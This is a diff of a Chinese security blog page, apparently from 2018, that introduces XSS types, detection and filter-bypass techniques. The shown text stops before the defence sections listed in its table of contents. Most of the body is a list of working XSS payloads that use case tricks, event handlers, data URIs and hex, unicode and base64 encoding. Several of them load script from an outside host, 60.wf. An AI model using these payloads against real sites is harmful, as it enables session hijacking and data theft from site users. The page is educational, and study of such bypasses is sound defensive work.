@@ -1,304 +1,243 @@
-
-
 <!DOCTYPE html>
-<html lang="">
-<head prefix="og: http://ogp.me/ns#"><meta name="generator" content="Hexo 3.8.0">
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="description" content="">
-    <title>浅谈跨站脚本绕过和防御 | c1y2m3’blog</title>
+    <meta name="keyword" content="">
+    <link rel="shortcut icon" href="/c1y2m3.github.io/img/favicon.ico">
 
-    <!-- Open Graph -->
-    <meta name="description" content="&amp;#x6700;&amp;#x8FD1;&amp;#x4E00;&amp;#x76F4;&amp;#x504F;&amp;#x5411;&amp;#x8FD9;&amp;#x65B9;&amp;#x9762;&amp;#x7684;&amp;#x6316;&amp;#x6398;,&amp;#x4E5F;&amp;#x9047;&amp;#x5230;&amp;#x4E86;&amp;#x5F88;&amp;#x591A;&amp;#x6709;&amp;#x8DA3;&amp;#x7684;&amp;#x60C5;&amp;#x51B5;,&amp;#x6545;&amp;#x603">
-<meta property="og:type" content="article">
-<meta property="og:title" content="浅谈跨站脚本绕过和防御">
-<meta property="og:url" content="http://yoursite.com/2018/10/18/浅谈跨站脚本绕过和防御/index.html">
-<meta property="og:site_name" content="c1y2m3’blog">
-<meta property="og:description" content="&amp;#x6700;&amp;#x8FD1;&amp;#x4E00;&amp;#x76F4;&amp;#x504F;&amp;#x5411;&amp;#x8FD9;&amp;#x65B9;&amp;#x9762;&amp;#x7684;&amp;#x6316;&amp;#x6398;,&amp;#x4E5F;&amp;#x9047;&amp;#x5230;&amp;#x4E86;&amp;#x5F88;&amp;#x591A;&amp;#x6709;&amp;#x8DA3;&amp;#x7684;&amp;#x60C5;&amp;#x51B5;,&amp;#x6545;&amp;#x603">
-<meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-11-22T03:30:19.000Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="浅谈跨站脚本绕过和防御">
-<meta name="twitter:description" content="&amp;#x6700;&amp;#x8FD1;&amp;#x4E00;&amp;#x76F4;&amp;#x504F;&amp;#x5411;&amp;#x8FD9;&amp;#x65B9;&amp;#x9762;&amp;#x7684;&amp;#x6316;&amp;#x6398;,&amp;#x4E5F;&amp;#x9047;&amp;#x5230;&amp;#x4E86;&amp;#x5F88;&amp;#x591A;&amp;#x6709;&amp;#x8DA3;&amp;#x7684;&amp;#x60C5;&amp;#x51B5;,&amp;#x6545;&amp;#x603">
-
-    <script type="application/ld+json">
-{
-  "@context": "http://schema.org",
-  "@type": "Person",
-  "email": "mailto:",
-  "image": "",
-  "name": "John Doe",
-  "url": "http://yoursite.com"
-}
-</script>
-    <script>
-    var algoliaEnabled = false;
-    
-</script>
-
-    
-
-    
-    
-        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-    
-    
-    
-        <!-- stylesheets list from config.yml -->
+    <title>
         
-        <link rel="stylesheet" href="/c1y2m3.github.io/css/aloha.css">
+        浅谈跨站脚本绕过和防御 - undefined
         
-        <link rel="stylesheet" href="//cdn.bootcss.com/semantic-ui/2.2.4/semantic.min.css">
-        
-        <link rel="stylesheet" href="//cdn.bootcss.com/magnific-popup.js/1.1.0/magnific-popup.min.css">
-        
-    
+    </title>
 
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/c1y2m3.github.io/css/aircloud.css">
+    <link rel="stylesheet" href="/c1y2m3.github.io/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
 </head>
-<body id="body" style="margin-bottom: 0;" class="pushable">
 
-    <div class="ui top fixed menu">
-        <a class="item" id="menu-icon"><i class="sidebar icon"></i></a>
-    </div>
+<body>
 
-    <div id="menu-sidebar" class="ui left vertical sidebar menu">
-
-    <div id="sidebar-top">
-        <div class="content">
-            <h3>c1y2m3’blog</h3>
-        </div>
-    </div>
-    <div class="ui container sidebar-card">
-    <div class="ui people shape content">
-        <div class="active side">
-            <div class="ui card">
-                <div class="image">
-                    <img class="ui medium bordered image" src="/c1y2m3.github.io/images/avatar.jpg">
-                </div>
-                <div class="content">
-                    <a class="header">John Doe</a>
-                    
-                </div>
-                <div class="extra content">
-                    <div class="ui list">
-                        
-                        
-                    </div>
-
-                </div>
-                <div class="extra content">
-                    <div class="ui list">
-                        
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
 </div>
 
-    
-    
+<div class="index-about">
+    <i>  </i>
+</div>
 
+<div class="index-container">
     
-
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/c1y2m3.github.io/">
+        </div>
+        <div class="name">
+            <i>John Doe</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/c1y2m3.github.io/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li>
+                <a href="/c1y2m3.github.io/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li>
+                <a href="/c1y2m3.github.io/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li>
+                <a href="/c1y2m3.github.io/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
     
-    <a href="/index.html" class="item">
-        <i class="home icon"></i>
-        HOME
-    </a>
-
-    
-
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-XSS分类"><span class="toc-text">0x01   XSS分类 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS危害"><span class="toc-text">XSS危害:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS探测"><span class="toc-text">XSS探测:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于绕过"><span class="toc-text">关于绕过:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如果过滤-lt-script-gt-的前提下"><span class="toc-text">如果过滤&lt;script&gt;的前提下:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如果过滤script情况下"><span class="toc-text">如果过滤script情况下 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如果输出在-lt-script-gt-标签下"><span class="toc-text">如果输出在&lt;script&gt;标签下 :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于javascript-x16进制编码"><span class="toc-text">关于javascript x16进制编码:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于十进制编码"><span class="toc-text">关于十进制编码:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于Base64编码"><span class="toc-text">关于Base64编码:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-XSS防御"><span class="toc-text">0x02 XSS防御:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#设置httponly"><span class="toc-text">设置httponly</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-filter"><span class="toc-text">XSS filter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编码转义"><span class="toc-text">编码转义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#处理富文本"><span class="toc-text">处理富文本 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#处理所有输出类型的XSS漏洞"><span class="toc-text">处理所有输出类型的XSS漏洞</span></a></li></ol>
+</div>
     
 </div>
 
-    <div class="pusher body-content">
-        <div id="content" class="ui main container">
-            <!--<div class="ui one column grid">-->
-                <!--<div class="column">-->
-                    <!--<div class="ui main container">-->
-                        <div id="post-浅谈跨站脚本绕过和防御" class="ui main container article-type-post">
 
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
     
-
-    <div class="ui divided grid">
-
-        <div class="two column row" id="article-content">
-
-            <div class="thirteen wide computer thirteen wide tablet sixteen wide mobile column">
-                
-
-<h1 class="ui header">
-    
-    浅谈跨站脚本绕过和防御
-</h1>
+    <div class="index-middle">
+        <!-- Main Content -->
+        
 
 
+<div class="post-container">
+    <div class="post-title">
+        浅谈跨站脚本绕过和防御
+    </div>
 
-                <div class="article-inner">
+    <div class="post-meta">
+        <span class="attr">Post：<span>2018-10-18 00:34:14</span></span>
+        
+        
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
 
-                    <div class="article-entry" itemprop="articleBody">
-                        
-                        <p><code>&#x6700;&#x8FD1;&#x4E00;&#x76F4;&#x504F;&#x5411;&#x8FD9;&#x65B9;&#x9762;&#x7684;&#x6316;&#x6398;,&#x4E5F;&#x9047;&#x5230;&#x4E86;&#x5F88;&#x591A;&#x6709;&#x8DA3;&#x7684;&#x60C5;&#x51B5;,&#x6545;&#x603B; &#x7ED3;&#x4E00;&#x4E0B;&#x4E00;&#x4E9B;&#x81EA;&#x5DF1;&#x7684;&#x601D;&#x8DEF;&#x3002; &#x9759;&#x4E0B;&#x5FC3;&#x6765;,&#x8FB9;&#x5199;&#x8FB9;&#x5B66;&#x5427; ~</code></p>
-<p>&#x8DE8;&#x7AD9;&#x811A;&#x672C;&#x653B;&#x51FB; (Cross Site Scripting) &#x4FD7;&#x79F0;:XSS ,&#x5229;&#x7528;&#x7F51;&#x7AD9;&#x672C;&#x8EAB;&#x8BBE;&#x8BA1;&#x4E0D;&#x4E25;&#x8C28;,&#x5BFC;&#x81F4;&#x6267;&#x884C;&#x7528;&#x6237;&#x63D0;&#x4EA4;&#x7684;&#x6076;&#x610F;javascript&#x811A;&#x672C;,&#x5BF9;&#x7F51;&#x7AD9;&#x81EA;&#x8EAB;&#x9020;&#x6210;&#x5371;&#x5BB3;,XSS&#x6F0F;&#x6D1E;&#x662F;web&#x6E17;&#x900F;&#x4E2D;&#x6700;&#x5E38;&#x89C1;&#x800C;&#x53C8;&#x6700;&#x7075;&#x6D3B;&#x7684;&#x4E00;&#x4E2A;&#x6F0F;&#x6D1E;&#x3002;</p>
-<h2 id="0x01-XSS&#x5206;&#x7C7B;"><a href="#0x01-XSS&#x5206;&#x7C7B;" class="headerlink" title="0x01   XSS&#x5206;&#x7C7B; "></a>0x01   XSS&#x5206;&#x7C7B; </h2><p>#<code>&#x539F;&#x7406;&#x5F88;&#x91CD;&#x8981;, &#x4E00;&#x5B9A;&#x8981;&#x8BA4;&#x771F;&#x770B;&#x3002;</code><br>XSS&#x5927;&#x81F4;&#x5206;&#x4E3A;:&#x53CD;&#x5C04;&#x578B;&#x3001;&#x5B58;&#x50A8;&#x578B;&#x3001;DOM&#x578B;(&#x8FD9;&#x4E09;&#x79CD;)</p>
-<p><code>&#x53CD;&#x5C04;&#x578B;XSS: &#x53EA;&#x662F;&#x7B80;&#x5355;&#x5730;&#x628A;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x6570;&#x636E; &#x7531;&#x670D;&#x52A1;&#x7AEF;&#x53CD;&#x5C04;&#x7ED9;&#x6D4F;&#x89C8;&#x5668;,&#x653B;&#x51FB;&#x65F6;&#x9700;&#x8981;&#x7528;&#x6237;&#x914D;&#x5408;&#x70B9;&#x51FB;,&#x4E5F;&#x53EB;&#x201D;&#x975E;&#x6301;&#x4E45;&#x6027;XSS&#x201D;</code></p>
-<p><code>&#x5B58;&#x50A8;&#x578B;XSS: &#x4F1A;&#x628A;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x5728;&#x670D;&#x52A1;&#x5668;&#x7AEF;, &#x4E5F;&#x53EB;&#x201D;&#x6301;&#x4E45;&#x578B;XSS&#x201D; &#x5E38;&#x89C1;&#x5728;&#x7559;&#x8A00;&#x677F;,&#x8BC4;&#x8BBA;&#x5904;,(&#x56FE;&#x7247;&#x4E0A;&#x4F20;&#x5904;)&#xFF0C;&#x53D1;&#x5E16;&#x7B49;&#x5C55;&#x793A;&#x7528;&#x6237;&#x8F93;&#x5165;&#x5185;&#x5BB9;&#x7684;&#x529F;&#x80FD;&#x70B9;&#x3002;</code></p>
-<p>&#x7ECF;&#x5E38;&#x8BF4;&#x5230;Dom&#x578B;,&#x4E2A;&#x4EBA;&#x611F;&#x89C9;&#x4E5F;&#x662F;&#x53CD;&#x5C04;&#x7684;&#x4E00;&#x79CD;&#x5EF6;&#x4F38;&#x5427;,&#x4F46;&#x8FD8;&#x662F;&#x533A;&#x522B;&#x7684;,&#x8F93;&#x51FA;&#x7AEF;&#x4E0D;&#x540C; &#x3002; </p>
-<p><code>Dom&#x578B;: &#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4FEE;&#x6539;&#x9875;&#x9762;&#x7684;DOM &#x8282;&#x70B9; &#x5F62;&#x6210;&#x7684;XSS&#x6F0F;&#x6D1E;</code></p>
-<p>&#x6CE8;&#x610F;:&#x65E0;&#x8BBA;&#x662F;&#x53CD;&#x5C04;&#x578B;&#x548C;&#x5B58;&#x50A8;&#x578B;, &#x90FD;&#x662F;&#x9700;&#x8981;&#x4E0E;&#x670D;&#x52A1;&#x7AEF;&#x4EA4;&#x4E92;&#x7684;,&#x65E2;&#x670D;&#x52A1;&#x7AEF;&#x5C06;&#x63D0;&#x4EA4;&#x7684;&#x5185;&#x5BB9;&#x53CD;&#x9988;&#x5230;&#x4E86;html&#x6E90;&#x7801;&#x5185;, &#x5BFC;&#x81F4;&#x89E6;&#x53D1;XSS&#x3002;</p>
-<p>&#x800C;<strong>Dom&#x578B; XSS</strong>&#x662F;&#x4E0D;&#x9700;&#x8981;&#x670D;&#x52A1;&#x7AEF;&#x4EA4;&#x6362;&#x7684;, &#x53EA;&#x4E0E;&#x5BA2;&#x6237;&#x7AEF;&#x7684;js&#x4EA4;&#x4E92;, &#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x63D0;&#x4EA4;&#x7684;&#x6076;&#x610F;&#x4EE3;&#x7801;, &#x88AB;&#x653E;&#x5230;&#x4E86;js&#x4E2D;&#x6267;&#x884C; ,&#x7531;&#x6D4F;&#x89C8;&#x5668;&#x7AEF;&#x5B8C;&#x6210;,  &#x7136;&#x540E;&#x663E;&#x793A;&#x4E86;&#x51FA;&#x6765;, &#x90A3;&#x4E48;&#x8FD9;&#x79CD;&#x5F62;&#x5F0F;&#x6709;&#x4E00;&#x79CD;&#x95EE;&#x9898;, &#x56E0;&#x4E3A;&#x670D;&#x52A1;&#x7AEF;&#x8FD4;&#x56DE;&#x7684;&#x6E90;&#x7801;&#x90FD;&#x662F;&#x4E00;&#x6837;&#x7684;, &#x53EA;&#x4E0D;&#x8FC7;&#x6E90;&#x7801;&#x91CC;&#x9762;&#x5305;&#x542B;&#x4E86;&#x4E00;&#x6BB5;js,&#x53EF;&#x4EE5;&#x5728;&#x5BA1;&#x67E5;&#x6E90;&#x7801;&#x4E2D;&#x67E5;&#x770B; ,&#x8FD9;&#x5C5E;&#x4E8E;&#x524D;&#x7AEF;javascript&#x81EA;&#x8EAB;&#x7684;&#x6F0F;&#x6D1E;&#x3002;</p>
-<p>&#xFF08;&#x53C2;&#x8003;&#x641C;&#x7D22; <a href="http://wooyun.jozxing.cc" target="_blank" rel="noopener">http://wooyun.jozxing.cc</a> &#x4E4C;&#x4E91;&#x955C;&#x50CF; &#xFF09;</p>
-<h2 id="XSS&#x5371;&#x5BB3;"><a href="#XSS&#x5371;&#x5BB3;" class="headerlink" title="XSS&#x5371;&#x5BB3;:"></a>XSS&#x5371;&#x5BB3;:</h2><p><code>&#x53D1;&#x751F;&#x5728;&#x5BA2;&#x6237;&#x7AEF;,&#x76EE;&#x7684;&#x662F;&#x8BA9;&#x6D4F;&#x89C8;&#x5668;&#x6267;&#x884C;&#x4E00;&#x6BB5;&#x7528;&#x6237;&#x63D0;&#x4EA4;&#x7684;&#x6076;&#x610F;js&#x4EE3;&#x7801;,&#x4ECE;&#x800C;&#x8FBE;&#x5230;&#x9ED8;&#x79CD;&#x76EE;&#x7684;, &#x5229;&#x7528;&#x9762;&#x592A;&#x5E7F;&#x4E86; ,&#x5728;&#x8FD9;&#x52A0;&#x4E0D;&#x4E00;&#x4E00;&#x53BB;&#x7EC6;&#x8BF4;&#x4E86;,js&#x4E5F;&#x662F;&#x4E2A;&#x5F3A;&#x5927;&#x7684;&#x8BED;&#x8A00;</code></p>
-<h2 id="XSS&#x63A2;&#x6D4B;"><a href="#XSS&#x63A2;&#x6D4B;" class="headerlink" title="XSS&#x63A2;&#x6D4B;:"></a>XSS&#x63A2;&#x6D4B;:</h2><p><code>&lt;&gt;xss  &#x4E00;&#x822C;&#x4E3B;&#x8981;&#x4E0D;&#x8FC7;&#x6EE4; &#x201C;&lt;&#x201C; , &#x201C;&gt;&#x201D; &#x4E00;&#x822C;&#x90FD;&#x662F;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x7684;,&#x5F53;&#x7136;&#x8FD8;&#x662F;&#x8981;&#x770B;&#x5230;&#x8F93;&#x51FA;&#x5728;&#x4EC0;&#x4E48;&#x5730;&#x65B9;&#x7528;&#x4EC0;&#x4E48;&#x7ED5;&#x8FC7;&#x7684;&#x65B9;&#x6CD5;&#x3002; &#x968F;&#x673A;&#x5E94;&#x53D8;&#x5427;</code></p>
-<h2 id="&#x5173;&#x4E8E;&#x7ED5;&#x8FC7;"><a href="#&#x5173;&#x4E8E;&#x7ED5;&#x8FC7;" class="headerlink" title="&#x5173;&#x4E8E;&#x7ED5;&#x8FC7;:"></a>&#x5173;&#x4E8E;&#x7ED5;&#x8FC7;:</h2><p>&#x4EE5;&#x4E0B;&#x662F;&#x5728;&#x65E5;&#x5E38;&#x64CD;&#x4F5C;&#x4E2D;,&#x79EF;&#x7D2F;&#x7684;&#x6807;&#x7B7E;&#x3002;</p>
-<p>##&#x6CA1;&#x6709;&#x505A;&#x5982;&#x4F55;&#x8FC7;&#x6EE4;&#x7684;&#x60C5;&#x51B5;&#x4E0B;:</p>
-<p><code>&lt;sCRiPt/SrC=//60.wf/Sohr&gt;   &#x5927;&#x5C0F;&#x5199; &#x6BD4;&#x8F83;&#x5E38;&#x7528;</code></p>
-<h2 id="&#x5982;&#x679C;&#x8FC7;&#x6EE4;-lt-script-gt-&#x7684;&#x524D;&#x63D0;&#x4E0B;"><a href="#&#x5982;&#x679C;&#x8FC7;&#x6EE4;-lt-script-gt-&#x7684;&#x524D;&#x63D0;&#x4E0B;" class="headerlink" title="&#x5982;&#x679C;&#x8FC7;&#x6EE4;&lt;script&gt;&#x7684;&#x524D;&#x63D0;&#x4E0B;:"></a>&#x5982;&#x679C;&#x8FC7;&#x6EE4;<code>&lt;script&gt;</code>&#x7684;&#x524D;&#x63D0;&#x4E0B;:</h2><p><code>&lt;img src=x onerror=s=createElement(&#x2018;script&#x2019;);body.appendChild(s);s.src=&#x2018;https://60.wf/Sohr&#x2019;;&gt;</code></p>
+    </div>
+    <div class="post-content ">
+        <p><code>最近一直偏向这方面的挖掘,也遇到了很多有趣的情况,故总 结一下一些自己的思路。 静下心来,边写边学吧 ~</code></p>
+<p>跨站脚本攻击 (Cross Site Scripting) 俗称:XSS ,利用网站本身设计不严谨,导致执行用户提交的恶意javascript脚本,对网站自身造成危害,XSS漏洞是web渗透中最常见而又最灵活的一个漏洞。</p>
+<h2 id="0x01-XSS分类"><a href="#0x01-XSS分类" class="headerlink" title="0x01   XSS分类 "></a>0x01   XSS分类 </h2><p>#<code>原理很重要, 一定要认真看。</code><br>XSS大致分为:反射型、存储型、DOM型(这三种)</p>
+<p><code>反射型XSS: 只是简单地把用户输入的数据 由服务端反射给浏览器,攻击时需要用户配合点击,也叫”非持久性XSS”</code></p>
+<p><code>存储型XSS: 会把用户输入的数据存储在服务器端, 也叫”持久型XSS” 常见在留言板,评论处,(图片上传处)，发帖等展示用户输入内容的功能点。</code></p>
+<p>经常说到Dom型,个人感觉也是反射的一种延伸吧,但还是区别的,输出端不同 。 </p>
+<p><code>Dom型: 可以通过修改页面的DOM 节点 形成的XSS漏洞</code></p>
+<p>注意:无论是反射型和存储型, 都是需要与服务端交互的,既服务端将提交的内容反馈到了html源码内, 导致触发XSS。</p>
+<p>而<strong>Dom型 XSS</strong>是不需要服务端交换的, 只与客户端的js交互, 也就是说提交的恶意代码, 被放到了js中执行 ,由浏览器端完成,  然后显示了出来, 那么这种形式有一种问题, 因为服务端返回的源码都是一样的, 只不过源码里面包含了一段js,可以在审查源码中查看 ,这属于前端javascript自身的漏洞。</p>
+<p>（参考搜索 <a href="http://wooyun.jozxing.cc" target="_blank" rel="noopener">http://wooyun.jozxing.cc</a> 乌云镜像 ）</p>
+<h2 id="XSS危害"><a href="#XSS危害" class="headerlink" title="XSS危害:"></a>XSS危害:</h2><p><code>发生在客户端,目的是让浏览器执行一段用户提交的恶意js代码,从而达到默种目的, 利用面太广了 ,在这加不一一去细说了,js也是个强大的语言</code></p>
+<h2 id="XSS探测"><a href="#XSS探测" class="headerlink" title="XSS探测:"></a>XSS探测:</h2><p><code>&lt;&gt;xss  一般主要不过滤 “&lt;“ , “&gt;” 一般都是可以绕过的,当然还是要看到输出在什么地方用什么绕过的方法。 随机应变吧</code></p>
+<h2 id="关于绕过"><a href="#关于绕过" class="headerlink" title="关于绕过:"></a>关于绕过:</h2><p>以下是在日常操作中,积累的标签。</p>
+<p>##没有做如何过滤的情况下:</p>
+<p><code>&lt;sCRiPt/SrC=//60.wf/Sohr&gt;   大小写 比较常用</code></p>
+<h2 id="如果过滤-lt-script-gt-的前提下"><a href="#如果过滤-lt-script-gt-的前提下" class="headerlink" title="如果过滤&lt;script&gt;的前提下:"></a>如果过滤<code>&lt;script&gt;</code>的前提下:</h2><p><code>&lt;img src=x onerror=s=createElement(‘script’);body.appendChild(s);s.src=‘https://60.wf/Sohr’;&gt;</code></p>
 <p><code>&lt;svg onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,59,60,47,115,99,114,105,112,116,62))&gt;</code></p>
 <p><code>&lt;iframe/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,59,60,47,115,99,114,105,112,116,62))&gt;</code></p>
-<p>&#x9ED8;&#x4E9B;&#x7F51;&#x7AD9;&#x53EA;&#x662F;&#x8FC7;&#x6EE4;&#x4E86;&#x654F;&#x611F;&#x6807;&#x7B7E;,&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x6B63;&#x5219;&#x5339;&#x914D;&#x53BB;&#x62FC;&#x63A5;&#x7ED5;&#x8FC7;&#x3002;</p>
-<h2 id="&#x5982;&#x679C;&#x8FC7;&#x6EE4;script&#x60C5;&#x51B5;&#x4E0B;"><a href="#&#x5982;&#x679C;&#x8FC7;&#x6EE4;script&#x60C5;&#x51B5;&#x4E0B;" class="headerlink" title="&#x5982;&#x679C;&#x8FC7;&#x6EE4;script&#x60C5;&#x51B5;&#x4E0B; "></a>&#x5982;&#x679C;&#x8FC7;&#x6EE4;<code>script</code>&#x60C5;&#x51B5;&#x4E0B; </h2><p>data&#x534F;&#x8BAE;:<br><code>&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=&gt;&lt;/object&gt;</code></p>
-<p><code>&lt;iframe/src=&#x201C;data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==&#x201C;&gt;</code></p>
-<h2 id="&#x5982;&#x679C;&#x8F93;&#x51FA;&#x5728;-lt-script-gt-&#x6807;&#x7B7E;&#x4E0B;"><a href="#&#x5982;&#x679C;&#x8F93;&#x51FA;&#x5728;-lt-script-gt-&#x6807;&#x7B7E;&#x4E0B;" class="headerlink" title="&#x5982;&#x679C;&#x8F93;&#x51FA;&#x5728;&lt;script&gt;&#x6807;&#x7B7E;&#x4E0B; :"></a>&#x5982;&#x679C;&#x8F93;&#x51FA;&#x5728;<code>&lt;script&gt;</code>&#x6807;&#x7B7E;&#x4E0B; :</h2><p><code>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 50, 51, 41))</code></p>
+<p>默些网站只是过滤了敏感标签,可以根据正则匹配去拼接绕过。</p>
+<h2 id="如果过滤script情况下"><a href="#如果过滤script情况下" class="headerlink" title="如果过滤script情况下 "></a>如果过滤<code>script</code>情况下 </h2><p>data协议:<br><code>&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=&gt;&lt;/object&gt;</code></p>
+<p><code>&lt;iframe/src=“data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==“&gt;</code></p>
+<h2 id="如果输出在-lt-script-gt-标签下"><a href="#如果输出在-lt-script-gt-标签下" class="headerlink" title="如果输出在&lt;script&gt;标签下 :"></a>如果输出在<code>&lt;script&gt;</code>标签下 :</h2><p><code>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 50, 51, 41))</code></p>
 <p><code>document.write(String.fromCharCode(60,115,99,114,105,112,116,32,115,114,99,61,39,47,47,54,48,46,119,102,47,83,111,104,114,39,62,60,92,47,115,99,114,105,112,116,62))</code></p>
-<p><code>var s=document.createElement(&#x201C;script&#x201D;);s.src=&#x201C;//60.wf/Sohr&#x201D;;document.head.appendChild(s);</code></p>
-<h2 id="&#x5173;&#x4E8E;javascript-x16&#x8FDB;&#x5236;&#x7F16;&#x7801;"><a href="#&#x5173;&#x4E8E;javascript-x16&#x8FDB;&#x5236;&#x7F16;&#x7801;" class="headerlink" title="&#x5173;&#x4E8E;javascript x16&#x8FDB;&#x5236;&#x7F16;&#x7801;:"></a>&#x5173;&#x4E8E;javascript x16&#x8FDB;&#x5236;&#x7F16;&#x7801;:</h2><p><code>javascript:document.write(&#x201C;&lt;script src=&#x2018;//60.wf/Sohr&#x2019;&gt;&lt;/script&gt;&#x201D;);</code></p>
-<p>&#x7F16;&#x7801;&#x4E3A;:</p>
+<p><code>var s=document.createElement(“script”);s.src=“//60.wf/Sohr”;document.head.appendChild(s);</code></p>
+<h2 id="关于javascript-x16进制编码"><a href="#关于javascript-x16进制编码" class="headerlink" title="关于javascript x16进制编码:"></a>关于javascript x16进制编码:</h2><p><code>javascript:document.write(“&lt;script src=‘//60.wf/Sohr’&gt;&lt;/script&gt;”);</code></p>
+<p>编码为:</p>
 <p><code>java\x73\x63\x72\x69\x70\x74\x3a\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x77\x72\x69\x74\x65\x28\x22\x3c\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3d\x27\x2f\x2f\x36\x30\x2e\x77\x66\x2f\x53\x6f\x68\x72\x27\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x22\x29\x3b\x20;</code></p>
-<p>&#x53EF;&#x6839;&#x636E;&#x73AF;&#x5883;&#x518D;&#x6B21;URL&#x7F16;&#x7801; </p>
-<h2 id="&#x5173;&#x4E8E;&#x5341;&#x8FDB;&#x5236;&#x7F16;&#x7801;"><a href="#&#x5173;&#x4E8E;&#x5341;&#x8FDB;&#x5236;&#x7F16;&#x7801;" class="headerlink" title="&#x5173;&#x4E8E;&#x5341;&#x8FDB;&#x5236;&#x7F16;&#x7801;:"></a>&#x5173;&#x4E8E;&#x5341;&#x8FDB;&#x5236;&#x7F16;&#x7801;:</h2><p><code>location.href=&#x2018;javascript:document.write(&#x2018;&lt;script&gt;alert&lt;/script&gt;&#x2019;);</code></p>
-<p>&#x7F16;&#x7801;&#x4E3A;&#xFF1A;</p>
-<p><code>location.href=&#x2018;j\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0077\u0072\u0069\u0074\u0065\u0028\u0027\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0027\u0029\u003b</code></p>
-<h2 id="&#x5173;&#x4E8E;Base64&#x7F16;&#x7801;"><a href="#&#x5173;&#x4E8E;Base64&#x7F16;&#x7801;" class="headerlink" title="&#x5173;&#x4E8E;Base64&#x7F16;&#x7801;:"></a>&#x5173;&#x4E8E;Base64&#x7F16;&#x7801;:</h2><p><code>document.write(atob(&#x2018;PC9zY3JpcHQ+PHN2Zy9vbmxvYWQ9YWxlcnQoMSk7Pg==&#x2018;))</code></p>
